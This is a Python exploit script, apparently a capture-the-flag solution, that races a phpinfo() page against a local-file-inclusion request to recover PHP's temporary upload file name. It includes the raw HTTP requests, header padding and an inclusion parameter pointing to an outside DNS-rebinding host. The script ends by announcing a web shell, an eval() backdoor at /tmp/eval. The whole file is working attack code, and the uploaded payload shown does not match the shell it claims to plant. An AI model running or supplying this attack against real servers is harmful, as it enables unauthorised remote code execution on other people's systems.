import os
import socket
import sys


tag = 'kingkk'
PAYLOAD="""{}\r
olokinho meu\r""".format(tag)

UPLOAD="""-----------------------------7dbff1ded0714\r
Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r
Content-Type: text/plain\r
\r
{}
-----------------------------7dbff1ded0714--\r""".format(PAYLOAD)

padding="A" * 5000

INFOREQ="""POST /phpinfo.php?a={padding} HTTP/1.1\r
Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie={padding}\r
HTTP_ACCEPT: {padding}\r
HTTP_USER_AGENT: {padding}\r
HTTP_ACCEPT_LANGUAGE: {padding}\r
HTTP_PRAGMA: {padding}\r
Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r
Content-Length: {len}\r
Host: %s\r
\r
{upload}""".format(padding=padding, len=len(UPLOAD), upload=UPLOAD)

LFIREQ="""GET //?%\F0%\9F%\87%B0%\F0%\9F%\87%B7%\F0%\9F%\90%\9F=http://36573657.26f0124b.rbndr.us/korea?a=%s HTTP/1.1\r
User-Agent: Mozilla/4.0\r
Proxy-Connection: Keep-Alive\r
Host: %s\r
\r
\r
"""

class PHPINFO_LFI():
	def __init__(self, host, port):
		self.host = host
		self.port = int(port)
		self.req_payload= (INFOREQ % self.host).encode('utf-8')
		self.lfireq = LFIREQ
		self.offset = self.get_offfset()


	def get_offfset(self):
		'''
		获取tmp名字的offset
		'''
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((self.host, self.port))

		s.send(self.req_payload)
		page = b""
		while True:
			i = s.recv(4096)
			page+=i        
			if i == "":
				break

			if i.decode('utf8').endswith("0\r\n\r\n"):
				break
		s.close()

		pos = page.decode('utf8').find("[tmp_name] =&gt; ")
		print('get the offset :{} '.format(pos))

		if pos == -1:
			raise ValueError("No php tmp_name in phpinfo output")
		
		return pos+256 #多加一些字节

	def phpinfo_lfi(self): 
		'''
		同时发送phpinfo请求与lfi请求
		'''
		phpinfo = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		lfi = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    

		phpinfo.connect((self.host, self.port))
		lfi.connect((self.host, self.port))

		phpinfo.send(self.req_payload)

		infopage = b"" 
		while len(infopage) < self.offset:
			infopage += phpinfo.recv(self.offset)

		pos = infopage.decode('utf8').index("[tmp_name] =&gt; ")
		tmpname = infopage[pos+17:pos+31]

		lfireq = self.lfireq % (tmpname.decode('utf8'),self.host)
		lfi.send(lfireq.encode('utf8'))

		fipage = lfi.recv(4096)

		phpinfo.close()
		lfi.close()

		if fipage.decode('utf8').find(tag) != -1:
			return tmpname


if __name__ == '__main__':
	if len(sys.argv) < 4:
		print('usage:\n\texp.py 127.0.0.1 80 500')
		exit()
	host = sys.argv[1]
	port = sys.argv[2]
	attempts = sys.argv[3]
	print('{x}Start expolit {host}:{port} {attempts} times{x}'.format(x='*'*15, host=host, port=port, attempts=attempts))

	p = PHPINFO_LFI(host,port)
	for i in range(int(attempts)):
		print('Trying {}/{} times…'.format(i, attempts), end="\r")
		if p.phpinfo_lfi() is not None:
			print('Getshell success! at /tmp/eval "<?=eval($_REQUEST[1])?>"')
			exit()
	print(':( Failed')
